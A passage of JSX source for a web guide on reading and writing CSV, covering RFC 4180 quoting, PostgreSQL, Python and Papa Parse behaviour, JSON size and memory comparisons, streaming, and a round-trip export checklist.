          <Rich text={'`abc"def`'} /> verbatim for the case with no following delimiter. Second, the machine cannot know that a record
          ended until it sees the character after the line break, so it cannot be short-circuited by reading one line at a time —
          the quote flag has to survive across chunk boundaries, which is the whole reason streaming parsers exist as a different
          shape of library rather than as a loop wrapper.
        </P>
        <P>
          Backslash escapes are the other common extension, and they are a dialect choice, not a fix: RFC 4180 §2 has no escape
          character, so a reader that honours{' '}
          <Rich text={'`\\"`'} /> inside quoted fields is reading a different format. Our parser accepts them only when you select
          backslash escaping explicitly, and ignores them entirely under the default doubling policy, which is the RFC position.
        </P>
      </Section>

      <Section id="real-systems" title="How Postgres, Python, Papa Parse and spreadsheets read CSV" kicker="Implementations">
        <P>
          The abstract rules become concrete when you read what two real systems promise. PostgreSQL is the most explicit about CSV
          of any database: its{' '}
          <Rich text="`COPY`" /> command has a dedicated CSV format “used for importing and exporting the Comma-Separated Value (CSV)
          file format used by many other programs, such as spreadsheets”, and the documentation quotes the quoting rule verbatim — a
          field separated by a delimiter that contains a delimiter character, a quote character, or the ASCII decimal 13 or 10
          character is written enclosed in double quotes, with embedded quote characters doubled so they are not misread.
        </P>
        <P>
          More useful still is what it says about NULL, because that is where round trips die. In CSV mode the default NULL string is
          an unquoted empty string, which means an empty field on disk is indistinguishable from a missing value. PostgreSQL resolves
          the ambiguity in one direction only: a NULL is output as the NULL parameter string and is <em>never</em> quoted, while a
          non-NULL value that happens to match the NULL string <em>is</em> quoted, so an empty string is written as{' '}
          <Rich text={'`""`'} />. Two options complete the picture —{' '}
          <Rich text="`FORCE_QUOTE`" /> on{' '}
          <Rich text="`COPY TO`" /> quotes named columns even when they do not need it, and{' '}
          <Rich text="`FORCE_NOT_NULL`" /> on{' '}
          <Rich text="`COPY FROM`" /> treats unquoted empty strings as empty text rather than NULL. If your exports cross a database
          boundary, those four sentences decide whether your empty strings survive. Note too that a{' '}
          <Rich text="`COPY`" /> in text mode defaults to a tab delimiter and{' '}
          <Rich text={'`\\N`'} /> for NULL while CSV mode defaults to a comma and an unquoted empty field, and that{' '}
          <Rich text="`psql`" /> ends a{' '}
          <Rich text="`COPY FROM STDIN`" /> at a line containing only{' '}
          <Rich text={'`\\.`'} /> — a value that will appear in your SQL dump but not in your CSV.
        </P>
        <H3>The library that defines most people’s mental model</H3>
        <P>
          Python’s{' '}
          <Rich text="`csv`" /> module is worth reading even if you never write Python, because it names the dialects everyone
          imitates. The{' '}
          <Rich text="`excel`" /> dialect carries the properties Excel generates — comma delimiter, CRLF terminator, doubling
          escape.{' '}
          <Rich text="`excel_tab`" /> is the same file with tabs. The{' '}
          <Rich text="`unix`" /> dialect is the interesting one: LF terminator and every field quoted, which is a deliberate choice to
          be maximally boring to a reader. Three documented behaviours in that module trip people up repeatedly: the writer defaults
          to a CRLF{' '}
          <Rich text="`lineterminator`" /> while the reader is hard-coded to recognise either a carriage return or a line feed and
          ignores the dialect’s terminator completely; files must be opened with{' '}
          <Rich text={'`newline=""`'} /> or the platform’s newline translation corrupts the breaks inside quoted fields and adds a
          stray carriage return; and{' '}
          <Rich text="`skipinitialspace`" /> defaults to false, so the space after a comma belongs to the value unless you ask. The{' '}
          <Rich text="`QUOTE_NONNUMERIC`" /> writer mode has a reader-side consequence that surprises people — unquoted fields read
          back are converted to floats, so a text column that never needed quotes throws an error instead.
        </P>
        <P>
          In the browser, Papa Parse is the de facto reference implementation, and its option names map one-to-one onto the
          decisions this guide has been making:{' '}
          <Rich text="`delimiter`" /> (empty means guess from{' '}
          <Rich text="`delimitersToGuess`" />),{' '}
          <Rich text="`quoteChar`" />,{' '}
          <Rich text="`escapeChar`" />,{' '}
          <Rich text="`newline`" />,{' '}
          <Rich text="`skipEmptyLines`" /> and{' '}
          <Rich text="`dynamicTyping`" />. That last option is the honest benchmark for anyone claiming to “detect types”: it converts
          numeric and boolean data and, by its own documentation, ignores dates — the same boundary our safe mode draws, for the same
          reason. Dataframe loaders in every language inherit these choices rather than defining them, so read the dialect your
          loader documents rather than the one you assume.
        </P>
        <DataTable
          caption="What each system promises about the four decisions RFC 4180 leaves open"
          head={['Reader', 'Delimiter', 'Line breaks in quoted fields', 'Typing', 'Null']}
          rows={[
            ['Postgres COPY, CSV mode', 'comma by default, any single byte by option', 'Recognised and produced; the file is explicitly “not strictly one line per table row”', 'Column types come from the table, never the file', 'Unquoted empty string, configurable, FORCE_NOT_NULL to opt out'],
            ['Python csv, excel dialect', 'comma', 'Handled; requires newline="" at open time', 'None — every value is a string', 'None — an empty string is an empty string'],
            ['Papa Parse', 'guessed from a candidate list unless given', 'Handled, with a configurable newline', 'Optional dynamicTyping: numbers and booleans, not dates', 'Optional; skipEmptyLines controls blank records'],
            ['Spreadsheet software', 'invisible to the file — the producer’s locale and settings decided it', 'Handled when imported; a naive paste is a different story', 'Guessed per column, and the guess is written back on save', 'Blank is blank; the format has no separate spelling for empty text'],
          ]}
          foot="Row four is the reason CSV has a reputation. The other three are libraries or servers whose behaviour you configure once; the spreadsheet decides on your behalf, at double-click speed, and then saves its opinion into the file."
        />
      </Section>

      <Section id="streaming-and-size" title="Large files: streaming, memory and the size gap against JSON" kicker="Scale">
        <P>
          CSV is the smallest reasonable way to write a flat table, and the numbers are not close. We generated the same 100,000
          records, six columns, in four representations:
        </P>
        <DataTable
          caption="100,000 records × 6 columns, byte counts measured with TextEncoder"
          head={['Representation', 'Bytes', 'Relative to CSV (LF)']}
          rows={[
            ['CSV, LF terminators', '6,634,992', '1.000'],
            ['CSV, CRLF terminators', '6,734,993', '1.015'],
            ['JSON array of objects, minified', '12,534,960', '1.889'],
            ['JSON array of objects, indented two spaces', '16,734,961', '2.522'],
          ]}
          foot="The 5.9 MB gap is structural: JSON repeats all six key names in all 100,000 objects. That is 100,000 × 6 × (key length + 3 punctuation characters) of pure repetition, and no compressor can make it disappear for a consumer that must read the text directly."
        />
        <P>
          The size advantage is bought with a memory penalty on the way in, and the penalty is worse than people expect. Running{' '}
          <Rich text="`parseCsv`" /> alone over that 6,634,992-byte text moved the Node heap by about 67 MB — roughly ten times the
          number of bytes on disk — because every field becomes its own string, every record becomes an array, and the keyed-object
          form adds an object with six property slots per record on top. Emitting the JSON adds a further 16 MB string to the same
          heap. Two consequences follow: the array-of-arrays shape is materially cheaper than array-of-objects because it stores no
          key names per record, and turning type inference off is not the memory saving it looks like, because a string field costs
          at least as much as the number it would have become. Choosing{' '}
          <Rich text="`shape = array-of-arrays`" /> in the converter is a memory decision as much as a JSON-shape decision.
        </P>
        <H3>Why streaming CSV is harder than streaming JSON</H3>
        <P>
          A JSON parser can stream on token boundaries and never needs to care how lines fall. A CSV parser cannot stop at the line,
          because a quoted field may contain the very character your chunker uses as a boundary. A correct streaming reader therefore
          has to carry four things across the chunk edge: the quote flag, the partially built field, the partially built record, and a
          one-character memory of whether the previous chunk ended in{' '}
          <Rich text={'`\\r`'} /> — because a CRLF straddling two chunks must produce one record boundary, not two. Get that wrong and
          the trailing{' '}
          <Rich text={'`\\n`'} /> of the split pair opens a second boundary, which is where an unexplained empty record at the head of
          every chunk after the first comes from.
        </P>
        <P>
          Papa Parse exposes this as{' '}
          <Rich text="`step`" /> and{' '}
          <Rich text="`chunk`" /> callbacks plus a{' '}
          <Rich text="`worker`" /> option, and the sensible reading of that API surface is that the library owns the state machine and
          hands you finished records — never hand it a half-line and ask it to cope. PostgreSQL solves the same problem from the other
          end with{' '}
          <Rich text="`COPY FROM STDIN`" />, letting a client feed the server a stream without the server materialising a file. For
          browser tools the practical ceiling is simpler: our converter parses the text you paste or drop, in your browser, with no
          upload step, so the constraint is your tab’s memory rather than a server’s queue. For a file large enough to make that
          uncomfortable, the honest workflow is to split it on a record boundary you have verified is not inside a quoted field,
          convert the parts, and concatenate the JSON — which is safe precisely because{' '}
          <Rich text="[array-of-objects output](/format-converters/json-to-csv/)" /> is order-independent per record.
        </P>
        <Callout tone="tip" title="Three cheap wins on a big export">
          <P>
            Use LF terminators and accept the one-in-seventy size saving rather than arguing about it. Put the column list in a
            header row once instead of repeating keys per record, which is the entire point of CSV over JSON. And if a consumer is
            going to type your columns anyway, quote the identifier columns on write —{' '}
            <Rich text={'`"1234567890123"`'} /> costs the reader nothing and saves the writer an incident.
          </P>
        </Callout>
      </Section>

      <Section id="round-trip-decisions" title="A round-trip-safe export, and what our converter decides" kicker="Checklist">
        <P>
          Everything above reduces to a producer checklist and a consumer checklist. Run them in order and the file will mean the
          same thing on both ends.
        </P>
        <DataTable
          caption="Ten decisions, what the format says, and what to do"
          head={['#', 'Decision', 'Position to take']}
          rows={[
            ['1', 'Encoding', 'UTF-8. Add a BOM only for double-click audiences; set charset in the media type for machines'],
            ['2', 'Delimiter', 'Comma, unless the locale or the data says otherwise; then say which one, in the filename or the contract'],
            ['3', 'Terminator', 'One style for the whole file. CRLF matches RFC 4180 §2.1; LF is smaller and equally common'],
            ['4', 'Trailing break', 'Always emit one, so appenders cannot glue two records together'],
            ['5', 'Quoting policy', 'Minimal is correct; quote-all is safer with naive readers; quote anything numeric-looking that must stay text'],
            ['6', 'Header row', 'Present, unique, non-numeric, and declared in the contract'],
            ['7', 'Column set', 'The union across all records, in a fixed order; short rows leave the missing cells empty, never absent'],
            ['8', 'Identifiers', 'Text at every layer: no leading-zero codes or long digits through a numeric path'],
            ['9', 'Formula-lookalikes', 'Neutralise on write, refuse to evaluate on read, never rely on quoting alone'],
            ['10', 'Verification', 'Parse the file back and compare values, not bytes'],
          ]}
        />
        <P>
          Item 10 is the one this site exists to make easy, and it is where the converter’s output stops being a conversion report and
          becomes an audit. Load a file into the{' '}
          <Rich text="[CSV to JSON converter](/format-converters/csv-to-json/)" /> and every decision described in this guide is
          printed with the evidence behind it. The delimiter control reads{' '}
          <Rich text="`Auto` — detected" />{' '}
          <Rich text={'`","`'} /> and shows the sniffing reason sentence underneath, so you can see the consistency percentage that
          produced the verdict rather than trusting it.{' '}
          <Rich text="`First row is a header`" /> is a visible toggle rather than an assumption, and turning it off names the columns{' '}
          <Rich text="`column_1`" /> onward instead of borrowing a data value.{' '}
          <Rich text="`Type inference`" /> offers none, safe and aggressive, and the{' '}
          <Rich text="`Column typing decisions`" /> panel shows the label chosen per column plus examples wherever the answer was{' '}
          <Rich text="`string (mixed)`" />.
        </P>
        <P>
          The banner is where the file’s physical shape appears: line endings classified as one of CRLF, LF, CR, mixed or none; BOM
          reported as{' '}
          <Rich text="`present and stripped`" />; the count of quoted cells; the count of cells containing newlines, which is the
          number that tells you a line-oriented script will disagree with this parser; ragged rows; and finally{' '}
          <Rich text="`Round trip: identical`" /> or{' '}
          <Rich text="`Round trip: differs`" />, because the emitted JSON is re-parsed and compared before the tool claims anything.
          The{' '}
          <Rich text="`Spreadsheet risk in these values`" /> panel lists the formula prefixes, dropped leading zeros, long-number
          precision risks and the Excel row, column and cell ceilings described earlier, and the parse report below it lists each
          diagnostic with the line it belongs to. Above that sits the 2{' '}
          <sup>53</sup>−1 guard: a whole number beyond it is refused as a number, reported as{' '}
          <Rich text="`string-unsafe-number`" /> and accompanied by the sentence{' '}
          <Rich text={'`Column "a" row 2: 12345678901234567 is a whole number above 2^53−1.`'} />.
        </P>
        <P>
          On the way out, the{' '}
          <Rich text="[JSON to CSV converter](/format-converters/json-to-csv/)" /> makes the mirror-image decisions explicit: the line
          ending control is labelled{' '}
          <Rich text="`CRLF (RFC 4180 §2.1)`" /> against an LF option, the UTF-8 BOM toggle is labelled with the reason you would ever
          want it, nested objects are flattened into dotted column names you can see in the preview, and records that disagree about
          their keys produce the union column set plus a heterogeneous-records note rather than a file whose rows quietly change
          width. That is the whole thesis of this guide in two controls: the format cannot tell you what it means, so the tool has to
          say what it assumed. Compare the two representations side by side in{' '}
          <Rich text="[JSON vs CSV](/compare/json-vs-csv/)" /> or, if the argument in your team is about spreadsheets rather than
          bytes, in{' '}
          <Rich text="[CSV vs Excel](/compare/csv-vs-excel/)" />.
        </P>
      </Section>
    </Prose>
  )
}
